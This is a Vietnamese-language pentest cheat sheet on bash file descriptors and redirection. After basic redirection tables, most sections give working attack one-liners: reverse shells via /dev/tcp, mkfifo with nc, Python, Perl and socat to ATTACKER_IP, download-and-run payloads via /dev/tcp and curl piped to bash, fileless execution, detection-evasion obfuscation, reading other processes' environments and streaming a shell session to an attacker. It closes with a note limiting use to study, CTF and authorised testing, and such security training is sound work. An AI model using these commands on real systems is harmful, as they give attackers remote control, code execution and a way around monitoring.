# File Descriptor & Redirection — Pentest Cheat Sheet

> **Môi trường:** Bash/sh trên Linux (Kali, Ubuntu, Alpine, BusyBox)

---

## 1. File Descriptors (FD) Cơ Bản

|FD|Tên|Mô tả|`/proc/self/fd/`|
|---|---|---|---|
|`0`|stdin|Standard Input|`/proc/self/fd/0`|
|`1`|stdout|Standard Output|`/proc/self/fd/1`|
|`2`|stderr|Standard Error|`/proc/self/fd/2`|
|`3–9`|Custom|FD tùy chỉnh (mở thủ công)|`/proc/self/fd/3` ...|
|`255`|Internal|Shell internal (bash)|—|

---

## 2. Redirection Cơ Bản

|Cú pháp|Ý nghĩa|
|---|---|
|`cmd > file`|stdout → file (ghi đè)|
|`cmd >> file`|stdout → file (append)|
|`cmd < file`|stdin ← file|
|`cmd 2> file`|stderr → file|
|`cmd 2>> file`|stderr → file (append)|
|`cmd &> file`|stdout + stderr → file|
|`cmd &>> file`|stdout + stderr → file (append)|
|`cmd > file 2>&1`|stdout → file, stderr → stdout (portable)|
|`cmd 2>&1 > file`|⚠️ stderr → terminal, stdout → file (thứ tự quan trọng!)|
|`cmd 1>&2`|stdout → stderr|
|`cmd 2>/dev/null`|Nuốt stderr|
|`cmd >/dev/null 2>&1`|Nuốt tất cả output|
|`cmd > /dev/null 2>/dev/null`|Nuốt tất cả (tương đương)|

---

## 3. Pipe & Process Substitution

|Cú pháp|Ý nghĩa|
|---|---|
|`cmd1 \| cmd2`|stdout của cmd1 → stdin của cmd2|
|`cmd1 \|& cmd2`|stdout + stderr của cmd1 → stdin của cmd2 (bash)|
|`cmd1 2>&1 \| cmd2`|stdout + stderr → pipe (portable)|
|`<(cmd)`|Output của cmd như file (process substitution)|
|`>(cmd)`|Input vào cmd như file|
|`diff <(cmd1) <(cmd2)`|So sánh output 2 lệnh|

---

## 4. Here-Doc & Here-String

```bash
# Here-doc: truyền multi-line string vào stdin
cmd <<EOF
line1
line2
EOF

# Here-doc không expand biến
cmd <<'EOF'
$PATH sẽ không bị expand
EOF

# Here-doc với tab stripping
cmd <<-EOF
	indented line (tab đầu bị bỏ)
EOF

# Here-string: truyền 1 string vào stdin
cmd <<< "string"
base64 <<< "hello"
```

---

## 5. Custom File Descriptor (FD tùy chỉnh)

```bash
# Mở FD 3 để đọc
exec 3< /etc/passwd

# Mở FD 4 để ghi
exec 4> /tmp/out.txt

# Mở FD 5 để đọc/ghi
exec 5<> /tmp/rw.txt

# Đọc từ FD 3
read line <&3

# Ghi vào FD 4
echo "data" >&4

# Đóng FD
exec 3>&-
exec 4>&-
```

---

## 6. /dev/ Special Files (Pentest Quan Trọng)

|File|Mô tả|Dùng khi nào|
|---|---|---|
|`/dev/null`|Blackhole|Nuốt output|
|`/dev/zero`|Stream byte `\x00`|Tạo file rỗng, padding|
|`/dev/urandom`|Random bytes|Tạo key, token ngẫu nhiên|
|`/dev/stdin`|Alias FD 0|Đọc stdin explicit|
|`/dev/stdout`|Alias FD 1|Ghi stdout explicit|
|`/dev/stderr`|Alias FD 2|Ghi stderr explicit|
|`/dev/fd/N`|Alias FD N|Truy cập FD bất kỳ|
|`/dev/tcp/host/port`|TCP socket (bash)|Reverse shell, port check|
|`/dev/udp/host/port`|UDP socket (bash)|UDP shell|

---

## 7. /dev/tcp & /dev/udp — Network Tricks (Bash Built-in)

### Port Scanning (không cần nmap/nc)

```bash
# Kiểm tra 1 port (timeout 1 giây)
(echo >/dev/tcp/192.168.1.1/80) 2>/dev/null && echo "OPEN" || echo "CLOSED"

# Scan range port
for port in {20..1024}; do
  (echo >/dev/tcp/192.168.1.1/$port) 2>/dev/null && echo "$port OPEN"
done

# Với timeout
timeout 1 bash -c "echo >/dev/tcp/10.10.10.10/443" 2>/dev/null && echo "OPEN"
```

### Reverse Shell qua /dev/tcp

```bash
# Attacker lắng nghe: nc -lvnp 4444

# Victim — bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Variant: tách stdout/stderr
bash -i > /dev/tcp/ATTACKER_IP/4444 2>&1 0>&1

# Variant: exec
exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | bash >&5 2>&5

# Dùng /dev/udp
bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1
```

### Download File qua /dev/tcp (không cần wget/curl)

```bash
# Đọc HTTP response thô
exec 3<>/dev/tcp/10.10.10.10/80
echo -e "GET /shell.sh HTTP/1.0\r\nHost: 10.10.10.10\r\n\r\n" >&3
cat <&3
exec 3>&-

# Download và chạy
exec 3<>/dev/tcp/10.10.10.10/80; echo -e "GET /s.sh HTTP/1.0\r\nHost: 10.10.10.10\r\n\r\n" >&3; bash <&3
```

### Kiểm tra kết nối outbound (bypass firewall check)

```bash
# Ping alternative khi icmp bị block
(echo >/dev/tcp/8.8.8.8/53) 2>/dev/null && echo "DNS outbound OK"
(echo >/dev/tcp/1.1.1.1/443) 2>/dev/null && echo "HTTPS outbound OK"
```

---

## 8. Reverse Shell Variants (Dùng Redirection)

```bash
# Classic bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# sh (khi không có bash)
sh -i >& /dev/tcp/IP/PORT 0>&1

# Với exec (stealthier — ít process hơn)
exec bash -i >& /dev/tcp/IP/PORT 0>&1

# Tách stdin/stdout/stderr riêng biệt
bash -i 2>&1 1>/dev/tcp/IP/PORT 0<&1

# Dùng fifo (mkfifo) — hoạt động cả khi /dev/tcp không có
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
rm /tmp/f

# Mkfifo với bash (không cần nc)
mkfifo /tmp/p; bash </tmp/p >& /dev/tcp/IP/PORT 2>&1 &; cat > /tmp/p

# Named pipe tự dọn
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l PORT > /tmp/f
```

---

## 9. Ẩn Output / Stealth Techniques

```bash
# Chạy ngầm, không output, không lỗi
cmd >/dev/null 2>&1 &

# Disown process (không die khi logout)
cmd >/dev/null 2>&1 & disown

# Nohup + silent
nohup cmd >/dev/null 2>&1 &

# Redirect tất cả shell session về /dev/null
exec >/dev/null 2>&1

# Ẩn stderr của toàn bộ script
exec 2>/dev/null

# Ghi log vào FD ẩn
exec 9>/tmp/.hidden_log
echo "payload executed" >&9
exec 9>&-
```

---

## 10. Tee — Vừa Ghi File Vừa Pipe

```bash
# Ghi file VÀ tiếp tục pipe
cmd | tee output.txt | next_cmd

# Append
cmd | tee -a output.txt

# Ghi vào nhiều file
cmd | tee file1.txt file2.txt

# Ghi stderr cùng lúc
cmd 2>&1 | tee output.txt

# Pentest: capture và forward
nc -lvnp 4444 | tee /tmp/session.log | bash
```

---

## 11. Kỹ Thuật Bypass & Obfuscation

### Tránh spaced argument detection

```bash
# Thay space bằng IFS
IFS=,; cmd,arg1,arg2

# Dùng $'\x20' (space hex)
cat$'\x20'/etc/passwd

# Dùng brace expansion
{cat,/etc/passwd}

# Dùng wildcard
/???/??t /etc/passwd            # → /bin/cat /etc/passwd
/bin/c?t /etc/passwd
```

### Obfuscate lệnh với FD

```bash
# Chạy script từ FD (không để lại file trên disk lâu)
bash /dev/fd/3 3< <(curl -s http://IP/payload.sh)

# Đọc script từ stdin ẩn
curl -s http://IP/s.sh | bash /dev/stdin

# Exec từ process substitution
bash <(curl -s http://IP/s.sh)
```

### Ghi & Xóa Nhanh (Fileless-ish)

```bash
# Ghi vào tmpfs, chạy, xóa ngay
curl -s http://IP/shell.sh -o /dev/shm/.x && bash /dev/shm/.x; rm -f /dev/shm/.x

# Chạy từ memory (không ghi disk)
curl -s http://IP/shell.sh | bash

# heredoc không để file trên disk
bash <<'EOF'
# payload here
EOF
```

---

## 12. Xử Lý stderr Trong Pentest Scripts

```bash
# Chỉ lấy output thành công, bỏ qua lỗi
errors=$(cmd 2>&1 >/dev/null)      # lấy stderr vào biến
output=$(cmd 2>/dev/null)           # lấy stdout, bỏ stderr

# Swap stdout ↔ stderr
cmd 3>&1 1>&2 2>&3                 # stdout→FD3 (temp), stderr→stdout, FD3→stderr

# Capture cả hai riêng biệt
{ stdout=$(cmd 2>/tmp/err); } ; stderr=$(cat /tmp/err)
```

---

## 13. /proc Filesystem — FD Recon

```bash
# Xem FD đang mở của process
ls -la /proc/PID/fd

# Xem FD của chính mình
ls -la /proc/self/fd

# Đọc nội dung file đang mở (ngay cả khi đã bị xóa)
cat /proc/PID/fd/4

# Tìm file bị xóa đang được giữ bởi process
ls -la /proc/*/fd | grep deleted

# Xem cmdline của process
cat /proc/PID/cmdline | tr '\0' ' '

# Đọc environment của process
cat /proc/PID/environ | tr '\0' '\n'

# Tìm thông tin network
cat /proc/net/tcp          # IPv4 TCP connections (hex)
cat /proc/net/tcp6         # IPv6
cat /proc/net/udp

# Inject vào stdin của process khác (nếu có quyền)
echo "command" > /proc/PID/fd/0
```

---

## 14. Trickery với Descriptor Duplication

```bash
# Lưu và khôi phục stdout
exec 3>&1          # backup stdout → FD3
exec 1>/tmp/log    # redirect stdout → file
echo "goes to file"
exec 1>&3          # khôi phục stdout
exec 3>&-          # đóng FD3

# Redirect cả shell session
exec > >(tee -a /tmp/session.log)   # mọi output đều log

# Pentest: log toàn bộ shell về attacker
exec > >(nc IP PORT) 2>&1

# Đọc từ 2 nguồn song song
cat <(tail -f /var/log/auth.log) <(tail -f /var/log/syslog)
```

---

## 15. Quick Reference — Reverse Shell One-liners

```bash
# Bash /dev/tcp
bash -i >& /dev/tcp/IP/PORT 0>&1

# Exec variant
exec 5<>/dev/tcp/IP/PORT; cat <&5 | bash 2>&5 >&5

# Mkfifo (POSIX, mọi shell)
mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

# Python3
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in(PORT,inet_aton("IP"))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");'

# Socat (TTY đầy đủ)
# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:PORT
socat tcp:IP:PORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

---

## 16. Upgrade Shell với FD

```bash
# Sau khi có reverse shell — upgrade lên TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# hoặc
script -q /dev/null /bin/bash

# Background shell, set terminal
# Ctrl+Z
stty raw -echo; fg

# Trong shell:
export TERM=xterm-256color
stty rows 40 cols 160
reset
```

---

## Tips & Gotchas

|❗ Vấn đề|✅ Giải pháp|
|---|---|
|`2>&1 > file` thứ tự sai|Dùng `> file 2>&1`|
|`/dev/tcp` không hoạt động|Bash compiled `--disable-net-redirections`; dùng `nc` hoặc `socat`|
|Pipe làm mất exit code|Dùng `${PIPESTATUS[0]}` hoặc `set -o pipefail`|
|Here-doc expand biến không muốn|Quote delimiter: `<<'EOF'`|
|FD không đóng gây hang|Luôn `exec N>&-` sau khi dùng xong|
|`mkfifo` path bị monitor|Dùng `/dev/shm/`, `/run/`, `/tmp/`|
|Output bị buffer|Dùng `stdbuf -oL cmd` hoặc `unbuffer cmd`|

---

_Cheat sheet này chỉ dùng cho mục đích học tập, CTF, và kiểm thử bảo mật được ủy quyền._